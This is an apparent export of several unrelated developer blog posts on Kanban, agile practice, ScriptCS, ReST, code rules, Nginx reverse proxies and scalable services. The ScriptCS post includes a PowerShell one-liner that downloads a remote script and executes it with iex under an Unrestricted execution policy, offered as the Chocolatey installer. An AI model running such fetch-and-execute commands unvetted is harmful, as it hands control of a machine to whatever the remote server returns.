The sketch is based ona discussion we had about how we currently get from an idea to delivering onthat idea, and how we’d like to do that going forward.</p><p>While we probably should have done a full on<a href=\"http://en.wikipedia.org/wiki/Value_Stream_Mapping\" title=\"Value Stream Mapping\">Value Stream Map</a>, we didn’t.And the only excuse I have is that we’re kicking this product off so thereisn’t really a set way we do things… not yet anyhow.</p><p>At any rate, later today I’ll be turning this loose sketch into a physical<a href=\"http://en.wikipedia.org/wiki/Kanban\" title=\"Kanban\">Kanban</a>board that we’ll used to track and pull ideas through our ideationprocess, and feed the resulting features into our development process.</p><p>But first, I want to explain how the whole thing will work, or at least howwe’re going to start – I’m sure we’ll tweak some things, and change out wholeparts of this process as we go along. Let’s get started.</p><!-- more --><h3>Starting with an Idea</h3><p>Our process starts with an idea. An idea can be nearly anything that someone<em>thinks</em>will add value to the system. An idea might be laser-focused, or itmight be more nebulous. At this stage we don’t really care, it’s onlyimportant that we realize we have a potential value-adding idea and that we actupon it.</p><p>The Standardized Work (designated by the blue text in the lower box of eachstage) in this stage is pretty basic, though not necessarily easy. In essence,an idea needs to be evaluated to determine it will deliver value.</p><p>And what does<em>deliver value</em>mean?</p><blockquote><p><strong>Value is…</strong></p><p>Seen though the eyes of those who pay for, use, and derive value from the systems we create.</p></blockquote><p>There are many factors that go into determining if something is or is notvaluable. In our case it’s things like market demand, product vision androadmap, feature parity with competitors, availability of resources, effort,etc… Also, value is a temporal thing. So while an idea might not hold muchpromise for delivering value now, that doesn’t mean that it won’t at some pointin the future.</p><p>If it’s determined that an idea will deliver value now, the idea card is movedinto the Ready for Decomposition state. However, if the idea won’t delivervalue now (or at least within the very short, foreseeable future), it’s movedto a<em>Never</em>state. In the physical world that means the Idea Kanban is takenoff the board.</p><p><em>But wait… if the idea has potential to provide value in the future, and you’vemoved it to Never, won’t we lose track of it?</em></p><p><strong>YES, exactly!</strong>And you know what? We don’t care! If the idea truly haspotential for some future value, it will come back into our pipeline on itsown. Why waste time, effort, and money keeping track of a huge backlog of stuffthat might not ever happen?<a href=\"http://arcware.net/dmzing-the-backlog/\" title=\"DMZing the Backlog\">DMZ that stuff</a>.</p><h3>Ready for Decomposition</h3><p>Right now we have no queue limits on our Ready for Decomposition queue becausewe’re</p><ul><li>thinking our throughput will be high enough to keep the queue short anyhow</li><li>going to help our customers be honest with themselves and diligent indetermining which ideas really will provide value</li></ul><p>However, if we find this queue to be a bottleneck, or a source of thrashing,we’ll likely put a limit on it.</p><p>The first thing that needs to happen when any idea enters the Ready forDecomposition state is to re-prioritize the queue. This needs to happen so theteam knows which ideas are most important and should be decomposed first.</p><p>Decomposing an idea means doing necessary analysis activities to understand andflesh-out the idea, break it down into one or more Minimum MarketableFeature (MMF), and defining acceptance criteria (in a loose<a href=\"http://stevenharman.net/toward-a-better-use-of-context-specification\" title=\"Towared a Better Use of Context/Specification\">Context/Specification</a>style) for each feature. During thedecomposition the MMFs are transitioned to physical Kanbans that will feed intoand flow through our development pipeline. These are also known as FeatureCards within our organization.</p><h3>When to decompose?</h3><p>Idea decomposition is not a regularly scheduled activity, but is triggered by adownstream need for Feature Cards. That is, ideas are<em>pulled</em>through theIdeation Pipeline by some downstream activity that will move the idea closer toproviding value. We’re pulling from<a href=\"http://www.amazon.com/dp/0321437381/?tag=stevenharman-20\" title=\"Implementing Lean Software Development: From Concept to Cash\">Concept to Cash</a>.</p><p>It should also be noted that we only decompose as many ideas as are needed tosatisfy the source of the pull. In this case, that would be our developmentpipeline’s backlog queue. If the backlog has two spots open, and we decomposean idea into two MMFs, then we’re done decomposing for now. If we onlydecompose it into one MMF, then we’ll need to decompose another idea.</p><p>And what if that second idea decomposes into two or more MMFs? Now we’ve gotmore MMFs than we can fit in our backlog… oh no!</p><p>Actually, that’s just fine. Our development backlog is itself a prioritizedqueue. So we just need to prioritize all of the MMFs, fill the backlog with themost important ones, and let the rest sit in the Decomposed state until thebacklog pulls another one in.</p><h3>On to the development pipeline.</h3><p>Well… that’s what those MMF Kanbans would do anyhow. But you, dear reader, willhave to wait until later – like until I write a post that covers ourdevelopment pipeline.</p><h3>Other Resources</h3><p>If you’re looking for more information on some of the terms or concepts I’vementioned here, be sure to check out Karl Scotland’s excellent round-up oflinks/references to materials on<a href=\"http://availagility.wordpress.com/kanban/\" title=\"Useful links or references to material on Kanban Software Development.\">Kanban Software Development</a>.</p><div class=\"feedflare\"><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=KYv-eCh92uM:kVV5Bs6fE0s:G79ilh31hkQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=G79ilh31hkQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=KYv-eCh92uM:kVV5Bs6fE0s:cGdyc7Q-1BI\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=cGdyc7Q-1BI\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=KYv-eCh92uM:kVV5Bs6fE0s:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=KYv-eCh92uM:kVV5Bs6fE0s:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=KYv-eCh92uM:kVV5Bs6fE0s:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=KYv-eCh92uM:kVV5Bs6fE0s:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/stevenharman/~4/KYv-eCh92uM\" height=\"1\" width=\"1\"/>","author":false,"_id":{"$wrap":"$oid","v":931}}

In this article, <em>So Long and Thanks for all the Manifestos</em><span style=\"text-decoration: underline;\">,</span> I make a case for a new standard for agile software delivery. Simply put, we are now standing on the shoulders of giants like the Agile Manifesto signatories and 12 years of shared learning in the various agile communities. And things are bit clearer today than they were a decade years ago.</p><p>The original value statements and supporting values of the <em><a href=\"http://agilemanifesto.org\">Manifesto for Agile Software Development</a></em> are valid, valuable, and rare. There are plenty of teams out there delivering software without any formal acknowledgement or even awareness of the Agile Manifesto. Far be it from me to assert these teams aren’t agile just because the don’t follow a particular dogma or implement a specific technique.</p><p>In the last few years those teams I consider truly agile demonstrate similar patterns of behavior. To be honest, the values expressed in the Agile Manifesto may or not be present in these teams. Rather than thinking deeply about the value statements, many teams focus on behaviors I’ll call the <em>3 Pillars of Pragmatic Agility</em>.</p><h2>3 Pillars of Pragmatic Agility</h2><ol><li>Ship often.</li><li>Keep quality high.</li><li>Use feedback to improve.</li></ol><p>There is obviously a lot to discern and discuss about these three very high-level behaviors. I will leave the details for future writing, pontificating, and arguing.</p>","author":"David Starr","_id":{"$wrap":"$oid","v":953}}

As you may know by now, I’ve been searching for <a href=\"http://elegantcode.com/2012/11/30/visual-studio-light-edition/\" target=\"_blank\">a more lightweight .NET development experience</a> for quite some time. The ScriptCS project is here to fulfill this desperate need. Driven by <a href=\"https://github.com/scriptcs/scriptcs/wiki/Contributors\" target=\"_blank\">the open-source .NET community</a>, this wonderful initiative promises to unleash C# from Visual Studio which is exactly what I’ve been looking for.</p></p><p align=\"justify\">Being heavily inspired by the <a href=\"http://nodejs.org/\" target=\"_blank\">node.js</a> development workflow, ScriptCS is built on top of <a href=\"http://msdn.microsoft.com/en-us/vstudio/roslyn.aspx\" target=\"_blank\">Roslyn</a> and makes heavy use of NuGet for installing packages and <a href=\"https://github.com/scriptcs/scriptcs/wiki/Script-Packs-master-list\" target=\"_blank\">script packs</a>. You can get up and running in no time by installing ScriptCS using <a href=\"http://chocolatey.org/\" target=\"_blank\">Chocolatey</a>. If you didn’t have Chocolatey installed already (like me), then it can be easily done by running the following Powershell command:</p><blockquote><p align=\"justify\"><em>@powershell -NoProfile -ExecutionPolicy Unrestricted -Command \"iex ((New-Object Net.WebClient).DownloadString(‘</em><a href=\"https://chocolatey.org/install.ps1'))\"\"><em>https://chocolatey.org/install.ps1′))\"</em></a><em> && SET PATH=%PATH%;%systemdrive%\\chocolatey\\bin</em> </p></blockquote><p align=\"justify\">Now we can install ScriptCS by simply running the following command:</p><blockquote><p align=\"justify\"><em>cinst scriptcs</em></p></blockquote><p align=\"justify\">That’s all we need! </p><p align=\"justify\">Now in order to do something useful with it, we can clone the samples repository to our dev machine and try to run the <a href=\"http://nancyfx.org/\" target=\"_blank\">Nancy</a> sample application. Navigate to the <em>Nancy</em> folder in a command prompt and run the command <em>“scriptcs -install”</em> to install all package dependencies defined in the <em>packages.config</em> file. Next run the following command to start the web application:</p><p align=\"justify\"><a href=\"http://elegantcode.com/wp-content/uploads/2013/05/image1.png\"><img title=\"image\" style=\"border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px; display: inline\" border=\"0\" alt=\"image\" src=\"http://elegantcode.com/wp-content/uploads/2013/05/image_thumb.png\" width=\"409\" height=\"77\" /></a> </p><p align=\"justify\">Now open up your favorite browser, navigate to <a href=\"http://localhost:1234\">http://localhost:1234</a> and <em>et voilà</em>:</p><p align=\"justify\"><a href=\"http://elegantcode.com/wp-content/uploads/2013/05/image2.png\"><img title=\"image\" style=\"border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px; display: inline\" border=\"0\" alt=\"image\" src=\"http://elegantcode.com/wp-content/uploads/2013/05/image_thumb1.png\" width=\"409\" height=\"368\" /></a> </p><p align=\"justify\">Amazing isn’t it? </p><p align=\"justify\">I do recognize that the project is still very much a work in progress. Also something that’s not entirely clear for me is the deployment story. The road map mentions some kind of export functionality to an .exe or a Visual Studio Project. In any case, there should be an easy way to convert the code files into binary form. </p><p align=\"justify\">Something that I also would love to see is support for <a href=\"http://www.mono-project.com/Main_Page\" target=\"_blank\">Mono</a>. How cool would it be to develop and run C# code using ScriptCS on Mac and Linux?</p><p align=\"justify\">The future for ScriptCS certainly looks bright and I’m very much looking forward to where <a href=\"https://github.com/scriptcs/scriptcs/wiki/Goals-and-Roadmap\">this particular road</a> is taking the .NET universe. Take a look at the <a href=\"https://github.com/scriptcs/scriptcs/wiki\">wiki </a> and start familiarize yourself with ScriptCS as it’s going to open up very interesting opportunities for future .NET development.</p><p align=\"justify\">Until next time.</p>","author":"Jan Van Ryswyck","_id":{"$wrap":"$oid","v":955}}

After 5 months of soul-searching, ups and downs, I’m back, more focused than ever (think laser beam focus). This week has seen the launch of several important projects for me, and I’m very excited to share them with you, a year after my last blog post! The hiatus is over and Seb is back.</p><h1>Practical ReST – the book</h1><p>I’ve been talking for years about writing a brain dump of what I know of ReST. The project has started, you can pledge to <a href=\"http://kickstarter.com/projects/serialseb/practical-rest-building-hypermedia-systems\">buy your copy today</a> (in various editions) and get content as early as next month!</p><p>The response has been amazing, with three quarters of the minimum funding pledged in 48 hours. Of course, the more contributors the more time I can allocate to the book, the quicker the book will be in your hands, so don’t hesitate!</p><p>Writing a book in itself is a big challenge, and the scope is very ambitious. But it’s also a foray into self-publishing, and I expect it to be an amazing opportunity for learning.</p><h1>Practical ReST – the class</h1><p>I’ve been giving a ReST class for a while, but I’m rewriting it so it follows the same structure as the book, and make it open to people with many technological backgrounds.</p><p>First date should be in <a href=\"http://serialseb.com/rest/2013/04/09/London-class-May-2013.html\">May in London</a>, and I expect <a href=\"http://serialseb.com/rest/2013/04/12/Warsaw-class-planned.html\">Warsaw</a>, Vilnius and other locations to pop up this year.</p><p>If you want to see a workshop organised in your city (or your company), pop me an email.</p><p>I’m also launching a referral program *and* group rebates, so if you’re a training company and you want to add the course to your books, you can too.</p><h1>Hanselminutes podcast</h1><p>Scott was nice enough to have me on his show this week, talking about Practical ReST. It’s <a href=\"http://www.hanselminutes.com/366/practical-rest-with-sebastien-lambla\">published and ready to be listened to</a>, and while I was half-way through an asthma attack and having microphone problems, Scott saves the day by being a great host.</p><h1><a href=\"http://www.cancerresearchuk.org/home/\">Cancer Research UK</a></h1><p>You may remember that I asked for your contributions to help me raise money for cancer research UK. I can now announced that we raised more than 700£, and that both my objectives of non-drinking were achieved. I cannot thank you all enough for your generosity.</p><h1><a href=\"http://serialseb.com\">serialseb.com</a></h1><p>It had to happen. I now have my own web site. You cannot imagine how difficult it is for me to put work and effort in talking about what I did rather than what I want to do. But you will find on there a link to <a href=\"http://serialseb.com/speaker/\">all my previous talks</a>, with videos and slides (where applicable), as well as where you’ll find me next, my future talks and where classes will be delivered next.</p><h1>What next?</h1><p>ReST will be my focus for the next few months. I have a couple of other projects up my sleeve, but this is enough announcements for now, don’t you think?</p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/qkIUmK_J4Ow\" height=\"1\" width=\"1\"/>","author":"Sebastien Lambla","_id":{"$wrap":"$oid","v":982}}

It has been named <strong>Don’t assign a field from many methods</strong>. It falls into the category of <strong>Purity – Immutability – Side-Effects</strong> rules, one of my preferred set of rules since often hard-to-find and to-fix bugs come from wrong state managements.</p><p><a href=\"http://codebetter.com/patricksmacchia/files/2013/05/Screenshot2.png\"><img class=\"alignnone size-full wp-image-793\" title=\"Purity - Immutability - Side-Effects code rules\" alt=\"Screenshot2\" src=\"http://codebetter.com/patricksmacchia/files/2013/05/Screenshot2.png\" width=\"600\" height=\"292\" /></a></p><p>As its name suggests this rule matches fields assigned from multiple methods. Bugs due to corrupted state are often the consequence of fields anarchically assigned.</p><p>On many code bases tested, I found the threshold of 4 methods writer to be the best balanced number between too many false positives, and a decent amount of suspicious matches to look after at code-reviewing time. Of course this threshold is easily customizable.</p><p>Several parameters can be taken account.</p><ul><li>Is the field static? in which case it can be pretty serious if many methods assign it.</li><li>Does the field type is a value or a reference type? In the case of a reference type, such situation might reveal a potential <em>NullReferenceException</em> scenario luring.</li><li>Is the field assigned outside from its class. Since another rule prevents fields to be visible from outside its class, this case has been eliminated.</li><li>How many assigner methods of the parent class are visible outside the class? How many  methods calling directly or indirectly an assigner method are visible outside the class?</li><li>Can a particular class instance be accessed from multiple threads? in which case the situation sounds pretty alarming.</li></ul><p>Not all cases are taken account since static analysis have limits and for code review warning purposes the rule algorithm must be kept easily understandable. Here is the rule code and comments that contain insight about how to generally fix such issue.</p><p>I’d be curious to read your suggestions and comments on that.</p><script

On my current project we’ve building a distributed service oriented architecture that also exposes an HTTP API, and we’re using a reverse proxy to route requests addressed to our API to individual components. We have chosen the excellent<a href=\"http://wiki.nginx.org/Main\">Nginx</a>web server to serve as our reverse proxy; it’s fast, reliable and easy to configure. We use it to aggregate multiple services exposing HTTP APIs into a single URL space. So, for example, when you type:</p><p><a href=\"http://api.example.com/product/pinstripe_suit\">http://api.example.com/product/pinstripe_suit</a></p><p>It gets routed to:</p><p><a href=\"http://10.0.1.101:8001/product/pinstripe_suit\">http://10.0.1.101:8001/product/pinstripe_suit</a></p><p>But when you go to:</p><p><a href=\"http://api.example.com/customer/103474783\">http://api.example.com/customer/103474783</a></p><p>It gets routed to</p><p><a href=\"http://10.0.1.104:8003/customer/103474783\">http://10.0.1.104:8003/customer/103474783</a></p><p>To the consumer of the API it appears that they are exploring a single URL space (<a href=\"http://api.example.com/blah/blah\">http://api.example.com/blah/blah</a>), but behind the scenes the different top level segments of the URL route to different back end servers. /product/… routes to 10.0.1.101:8001, but /customer/… routes to 10.0.1.104:8003.</p><p>We also want this to be self-configuring. So, say I want to create a new component of the system that records stock levels. Rather than extending an existing component, I want to be able to write a stand-alone executable or service that exposes an HTTP endpoint, have it be automatically deployed to one of the hosts in my cloud infrastructure, and have Nginx automatically route requests addressed<a href=\"http://api.example.com/stock/whatever\">http://api.example.com/stock/whatever</a>to my new component.</p><p>We also want to load balance these back end services. We might want to deploy several instances of our new stock API and have Nginx automatically round robin between them.</p><p>We call each top level segment ( /stock, /product, /customer ) a<em>claim.</em>A component publishes an ‘AddApiClaim’ message over RabbitMQ when it comes on line. This message has 3 fields: ‘Claim', ‘ipAddress’, and ‘PortNumber’. We have a special component, ProxyAutomation, that subscribes to these messages and rewrites the Nginx configuration as required. It uses SSH and SCP to log into the Nginx server, transfer the various configuration files, and instruct Nginx to reload its configuration. We use<a href=\"http://mikehadlow.blogspot.co.uk/2013/05/sshnet.html\">the excellent SSH.NET</a>library to automate this.</p><p>A really nice thing about Nginx configuration is wildcard includes. Take a look at our top level configuration file:</p><div id=\"codeSnippetWrapper\"><div id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace;

Do you fork the source code of your previous customer, modify it a little and deploy it as its own instance with its own database? Maybe each customer even has their own server? Their own set of servers?</p><p>You are suffering from the<em>Fractured Product Syndrome</em>.</p><p>Let me tell you a story.</p><p>Colin and Alex have a little web development consultancy, called Coaltech (get it?) they are pretty handy with ASP.NET and SQL Server and already had a respectable list of satisfied clients when a local car hire company, Easy Wheels, asked them if they could build them a car booking system. It would keep a list of Easy Wheels’ cars and allow customers to view them and book them online.</p><p>Colin and Alex signed a contract with Easy Wheels and got busy. Their “just do it” attitude to getting features done meant that the code wasn’t particularly beautiful, but it did the job and after a couple of months work the system went live. Easy Wheels were very happy with their new system, so happy in fact that they started to tell other independent car rental companies about it. A few months later Colin and Alex got a call from Hire My Ride. They loved what Coaltech had done for Easy Wheels and wanted a similar system. Of course it would have to be redesigned to fit in with Hire My Ride’s branding, but the basic functionality was pretty much identical. Colin and Alex did the obvious thing, they took a copy of the Easy Wheels code and tweaked it for Hire My Ride. Of course they charged the same bespoke software price for Hire My Ride’s system.</p><p>Soon a third and fourth car hire company had asked Coaltech for their ‘system’. Each time Colin and Alex took a copy of the last customer’s code – it made sense to take the most recent code because they inevitably added a few refinements with each customer – and then they altered it to match the new customer’s requirements. Before long they had arranged a deal with another web agency to take over all their non-car-hire work and decided to concentrate full time on the ‘system’. It needed a name too, they couldn’t carry on calling it ‘Easy Wheels’ and they certainly couldn’t market it like that. Soon it became ‘Coaltech Cars’ with a new marketing website. They also found that they couldn’t keep up with demand with just the two of them doing customer implementations. Each new customer took around six weeks of development work with the inevitable to-and-fro of slightly different requirements and design changes. To help meet demand they started to hire developers. First Jez, then Dave, then Neville. They all modified the software in slightly different ways, but it didn’t seem to matter at the time.</p><p>Fast forward five years. Coaltech now has 50 employees and around 50 customers. It’s fair to say that they are the leading vendor of independent car rental management systems. The majority of their staff are developers, although they also have a small sales, HR and customer relationship management team. You would have thought that Colin and Alex would be happy to have turned their little web development company into such a success, but instead life just seemed to be one long headache. Although the company had grown, it always seemed hard to turn a profit. As it was customers often balked at the price of the system. The same bug would turn up again and again for different customers. There never seemed to be enough time to fix them all. Even though they might have delivered a new feature for one client, it always seemed to take just as long to implement it for another; sometimes longer depending on what code they’d been forked from. The small team that looked after the servers were in constant fire fighting mode and got very upset when anyone suggested ‘upgrading’ any of the clients -  it always meant bugs, downtime and screaming customers. And then the government changed the Value Added Tax rate. Colin had to cancel his holiday and they lost two of their best developers after several weeks of late nights and no weekends while they updated and redeployed 50 separate web applications.</p><p>The end for Coaltech cars came slowly and painfully. Alex had the first hint of it when he was made aware of a little company called RentBoy. They had a little software-as-a-service product for small car hire companies. To use it you entered your credit card number, a logo, a few other details, and you were good to go. They weren’t any immediate competition for Coaltech Cars, having only a small subset of the features, but they soon captured the low end of the market, the one or two man band car companies that had never been able to afford Coaltech’s sign up or licensing fees.</p><p>But then the features started coming thick and fast and soon Coaltech found they were loosing out to RentBoy when bidding for clients. Colin found an article on the<a href=\"http://highscalability.com/\">High Scalability</a>blog about RentBoy’s architecture. They had a single scalable application that served all their customers, one place to fix bugs, one point of scalability and maintenance. They practiced continuous deployment allowing them to quickly build and release new features for all their customers. The company had four employees and already more customers than Coaltech. They charged about a tenth of Coaltech’s fees.</p><p>Coaltech’s new client revenues soon dried up. They’d always made a certain amount of money from sign-up fees. Too late they realised that they had to start shedding staff, always a painful thing for a small closely knit company. The debts mounted until the bank would no longer support them, and before long they had to declare bankruptcy. Luckily Colin and Alex managed to get jobs as project managers in enterprise development teams.</p><p>The moral of the story? Try to avoid Fractured Product Syndrome if you possibly can. Although simply forking the source code for each new customer appears by far the easiest thing to do at the start, it simply doesn’t scale. Start thinking about how to build multi-tenanted software-as-a-service long before you get to where Coaltech got to. Learn to say ‘no’ to customers if you have to. It’s far better to have a high number of low value customers than smaller numbers of higher value ones on a differentiated platform. It’s much easier for a low-value volume software provider to move into the high-value space than for a high-value provider to move down.</p><p>Learn to recognise Fractured Product Syndrome and address it before it gets serious!</p>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":987}}

HTTP requests from a browser or web service client are routed directly to IIS which also hosts the ASP.NET worker process.  All the functionality needed to produce the web site is embodied in a single server. This includes caching, SSL termination, authentication, serving static files and compression. This approach is simple and straightforward for small sites, but is hard to scale, both in terms of performance, and in terms of managing the complexity of a large complex application. This is especially true if you have a distributed service oriented architecture with multiple HTTP endpoints that appear and disappear frequently.</p><p>A reverse proxy is server component that sits between the internet and your web servers. It accepts HTTP requests, provides various services, and forwards the requests to one or many servers.</p><p><img title=\"font-side-proxy\" style=\"border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px; display: inline\" border=\"0\" alt=\"font-side-proxy\" src=\"http://lh4.ggpht.com/-woCHbnyXB3k/UYPWR481THI/AAAAAAAAIx8/xn9GR0qAqC4/font-side-proxy%25255B5%25255D.png?imgmax=800\" width=\"600\" height=\"278\" /></p><p>Having a point at which you can inspect, transform and route HTTP requests before they reach your web servers provides a whole host of benefits. Here are some:</p><p><strong>Load Balancing</strong></p><p>This is the reverse proxy function that people are most familiar with. Here the proxy routes incoming HTTP requests to a number of identical web servers. This can work on a simple round-robin basis, or if you have statefull web servers (it’s better not to) there are session-aware load balancers available. It’s such a common function that load balancing reverse proxies are usually just referred to as ‘load balancers’. There are specialized load balancing products available, but many general purpose reverse proxies also provide load balancing functionality.</p><p><strong>Security</strong></p><p>A reverse proxy can hide the topology and characteristics of your back-end servers by removing the need for direct internet access to them. You can place your reverse proxy in an internet facing DMZ, but hide your web servers inside a non-public subnet.</p><p><strong>Authentication</strong></p><p>You can use your reverse proxy to provide a single point of authentication for all HTTP requests.</p><p><strong>SSL Termination</strong></p><p>Here the reverse proxy handles incoming HTTPS connections, decrypting the requests and passing unencrypted requests on to the web servers. This has several benefits:</p><ul><li>Removes the need to install certificates on many back end web servers.</li><li>Provides a single point of configuration and management for SSL/TLS</li><li>Takes the processing load of encrypting/decrypting HTTPS traffic away from web servers.</li><li>Makes testing and intercepting HTTP requests to individual web servers easier.</li></ul><p><strong>Serving Static Content</strong></p><p>Not strictly speaking ‘reverse proxying’ as such. Some reverse proxy servers can also act as web servers serving static content. The average web page can often consist of megabytes of static content such as images, CSS files and JavaScript files. By serving these separately you can take considerable load from back end web servers, leaving them free to render dynamic content.</p><p><strong>Caching</strong></p><p>The reverse proxy can also act as a cache. You can either have a dumb cache that simply expires after a set period, or better still a cache that respects Cache-Control and Expires headers. This can considerably reduce the load on the back-end servers.</p><p><strong>Compression</strong></p><p>In order to reduce the bandwidth needed for individual requests, the reverse proxy can decompress incoming requests and compress outgoing ones. This reduces the load on the back-end servers that would otherwise have to do the compression, and makes debugging requests to, and responses from, the back-end servers easier.</p><p><strong>Centralised Logging and Auditing</strong></p><p>Because all HTTP requests are routed through the reverse proxy, it makes an excellent point for logging and auditing.</p><p><strong>URL Rewriting</strong></p><p>Sometimes the URL scheme that a legacy application presents is not ideal for discovery or search engine optimisation. A reverse proxy can rewrite URLs before passing them on to your back-end servers. For example, a legacy ASP.NET application might have a URL for a product that looks like this:</p><p><em>http://www.myexampleshop.com/products.aspx?productid=1234</em></p><p>You can use a reverse proxy to present a search engine optimised URL instead:</p><p><em>http://www.myexampleshop.com/products/1234/lunar-module</em></p><p><strong>Aggregating Multiple Websites Into the Same URL Space</strong></p><p>In a distributed architecture it’s desirable to have different pieces of functionality served by isolated components. A reverse proxy can route different branches of a single URL address space to different internal web servers.</p><p>For example, say I’ve got three internal web servers:</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\">http://products.internal.net/<br />http://orders.internal.net/<br />http://stock-control.internal.net/</pre><br /></div><p>I can route these from a single external domain using my reverse proxy:</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\">http://www.example.com/products/    -<span style=\"color: #0000ff\">&gt;</span>http://products.internal.net/<br />http://www.example.com/orders/    -<span style=\"color: #0000ff\">&gt;</span>http://orders.internal.net/<br />http://www.example.com/stock/    -<span style=\"color: #0000ff\">&gt;</span>http://stock-control.internal.net/</pre><br /></div><p></p><p>To an external customer it appears that they are simply navigating a single website, but internally the organisation is maintaining three entirely separate sites. This approach can work extremely well for web service APIs where the reverse proxy provides a consistent single public facade to an internal distributed component oriented architecture.</p><p><strong>So …</strong></p><p>So, a reverse proxy can off load much of the infrastructure concerns of a high-volume distributed web application.</p><p>We’re currently looking at<a href=\"http://wiki.nginx.org/Main\">Nginx</a>for this role.

One of the core benefits of a service oriented approach is the promise of greatly enhanced scalability and redundancy. But to realise these benefits we have to write our services to be ‘scalable’. What does this mean?</p><p>There are two fundamental ways we can scale software: 'Vertically' or 'horizontally'.</p><ul><li><p><strong>Vertical Scaling</strong>addresses the scalability of a single instance of the service. A simple way to scale most software is simply to run it on a more powerful machine; one with a faster processor or more memory. We can also look for performance improvements in the way we write the code itself. An excellent example of company using this approach is<a href=\"http://martinfowler.com/articles/lmax.html\">LMAX</a>. However, there are many drawbacks to the vertical scaling approach. Firstly the costs are rarely linear; ever more powerful hardware tends to be exponentially more expensive and the costs (and constraints) of building sophisticated performance optimised software are also considerable. Indeed premature performance optimisation often leads to overly complex software that's hard to reason about and therefore more prone to defects and high maintenance costs. Most importantly, vertical scaling does not address redundantcy; vertically scaling an application just turns a small single point of failure into a large single point of failure.</p></li><li><p><strong>Horizontal Scaling.</strong>Here we run multiple instances of the application rather than focussing on the performance of a single instance. This has the advantage of being linearly scalable; rather than buying a bigger, more expensive box, we just buy more copies of the same cheap box. With the right architectural design, this approach can scale massively. Indeed it's the approach taken by almost all of largest internet scale companies: Facebook, Google, Twitter etc.. Horizontal Scaling also introduces redundancy; the loss of a single node need not impact the system as a whole. For these reasons, horizontal scaling is the preferred approach to building scalable, redundant systems.</p></li></ul><p>So, the fundamental approach to building scalable systems is to compose them of horizontally scaled services. In order to do this we need to follow a few basic principles:</p><ul><li><p><strong>Stateless.</strong>Any services that stores state across an interaction with another service is hard to scale. For example, a web service that stores in-memory session state between requests requires a sophisticated session-aware load balancer. A stateless service, by contrast, only requires simple round-robin load balancing. For a web application (or service) you should avoid using session state or any static or application level variables.</p></li><li><p><strong>Coarse Grained API.</strong>To be stateless, a service should expose an API that exposes operations as a single interaction. A chatty API, where one sets up some data, asks for some transition, and then reads off some results, implies statefulness by its design. The service would need to identify a session and then maintain information about that session between successive calls. Instead a single call, or message, to the service should encapsulate all the information that the service requires to complete the operation.</p></li><li><p><strong>Idempotent.</strong>Much scalable infrastructure is a trade-off between competing constraints. Delivery guarantees are one of these. For various reasons it's is far simpler to guarantee 'at least once' delivery than 'exactly once'. If you can make your software tolerant of multiple deliveries of the same message it will be easier to scale.</p></li><li><p><strong>Embrace Failure.</strong>Arrays of services are redundant if the system as a whole can survive the loss of a single node. You should design your services and infrastructure to expect and survive failure. Consider implementing a<a href=\"http://www.codinghorror.com/blog/2011/04/working-with-the-chaos-monkey.html\">Chaos Monkey</a>that randomly kills processes. If you start by expecting your services to fail, you'll be prepared when they inevitably do.</p></li><li><p><strong>Avoid instance specific configuration.</strong>A scalable service should be designed in such a way that it doesn't need to know about other instances of itself, or have to identify itself as a specific instance. I shouldn't need to have to configure one instance any differently than another. This would include communication mechanisms that require messages to be addressed to a specific instance of the service, or some non-convention based way that the service was required to identify itself. Instead we should rely on infrastructure (load-balancers, pub-sub messaging etc.) to manage the communication between arrays of services.</p></li><li><p><strong>Simple automated deployment.</strong>Have a service that can scale is no advantage if we can't deploy it when we are close to capacity. A scalable system must have automated processes to deploy new instances of services as the need arises.</p></li><li><p><strong>Monitoring.</strong>We need to know when services are close to capacity so that we can add additional service instances. Monitoring is usually an infrastructure concern; we should be monitoring CPU, network, and memory usage and have alerts in place to warn us when these pass certain trigger points. Sometimes it's worth introducing application specific alerts when some internal trigger is reached, such as the number of items in an in-memory queue, for example.</p></li><li><p><strong>KISS - Keep It Small and Simple.</strong>This is good advice for any software project, but is especially pertinent to building scalable resilient systems. Large monolithic codebases are hard to reason about, hard to monitor, and hard to scale. Building your system out of many small pieces makes it easy to address those pieces independently. Design your system so that each service has only one purpose and is decoupled from the operations of other services. Have your services communicate using non-proprietary open standards to avoid vendor lock-in and allow for a heterogeneous platform. JSON over HTTP, for example, is an excellent choice for intra-service communication. Every platform has HTTP and JSON libraries and there is abundant off-the-shelf infrastructure (proxies, load-balancers, caches) that can be used to help your system scale.</p></li></ul><p>This post just gives a few pointers to building scalable systems, for far more detailed examples and case studies I can't recommend the<a href=\"http://highscalability.com/\">High Scalability Blog</a>enough.

